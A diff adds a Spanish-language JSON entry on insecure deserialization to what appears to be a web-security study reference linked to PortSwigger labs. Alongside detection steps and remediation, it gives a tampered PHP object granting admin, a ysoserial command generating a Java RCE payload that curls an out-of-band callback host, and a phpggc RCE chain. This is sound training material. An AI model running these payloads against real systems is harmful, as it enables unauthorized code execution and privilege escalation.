@@ -1,0 +1,48 @@
+{
+  "id": "insecure-deserialization",
+  "name": "Insecure Deserialization",
+  "category": "Server-side",
+  "severity": "Critical",
+  "aka": ["Deserialization", "Object injection"],
+  "summary": "La aplicación deserializa datos controlados por el atacante sin validar, permitiendo manipular objetos y, mediante gadget chains, llegar a ejecución de código.",
+  "where_to_look": [
+    "Cookies, parámetros o campos ocultos que contienen objetos serializados.",
+    "PHP: cadenas que empiezan por O: o a:. Java: bytes que empiezan por ac ed 00 05 (rO0 en base64). .NET: ViewState."
+  ],
+  "detection": [
+    "Identifica datos serializados por su formato (PHP, Java, Python pickle, .NET).",
+    "Modifica un atributo del objeto (p. ej. admin=true) y observa el efecto.",
+    "Si hay librerías con gadgets conocidos, intenta una cadena para RCE."
+  ],
+  "burp_steps": [
+    "Localiza el dato serializado (a menudo en una cookie) y decodifícalo.",
+    "Edita campos para escalar privilegios o cambiar la lógica y re-serializa.",
+    "Para Java/PHP, usa ysoserial / phpggc para generar una gadget chain.",
+    "Sustituye el objeto por la cadena maliciosa y observa la ejecución (OAST para ciega)."
+  ],
+  "payloads": {
+    "PHP objeto serializado": [
+      "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:5:\"admin\";b:1;}"
+    ],
+    "Identificadores de formato": [
+      "PHP: O:/a:  | Java: rO0AB (base64) / ac ed 00 05 (hex)  | .NET: __VIEWSTATE"
+    ]
+  },
+  "commands": [
+    {"tool": "ysoserial", "desc": "Generar payload Java para RCE", "cmd": "java -jar ysoserial.jar CommonsCollections4 'curl http://BURP-COLLAB' | base64"},
+    {"tool": "phpggc", "desc": "Generar gadget chain PHP", "cmd": "phpggc Monolog/RCE1 system 'id' -b"}
+  ],
+  "remediation": [
+    "No deserialices datos provenientes de fuentes no confiables.",
+    "Usa formatos de datos sin capacidad de instanciar objetos (JSON) con validación estricta.",
+    "Firma/verifica integridad de los objetos y aplica allowlists de clases."
+  ],
+  "portswigger_labs": [
+    {"title": "Modificar objetos serializados", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects"},
+    {"title": "Gadget chain en PHP para RCE", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php"}
+  ],
+  "references": [
+    {"title": "PortSwigger — Insecure deserialization", "url": "https://portswigger.net/web-security/deserialization"},
+    {"title": "OWASP — Deserialization", "url": "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"}
+  ]
+}
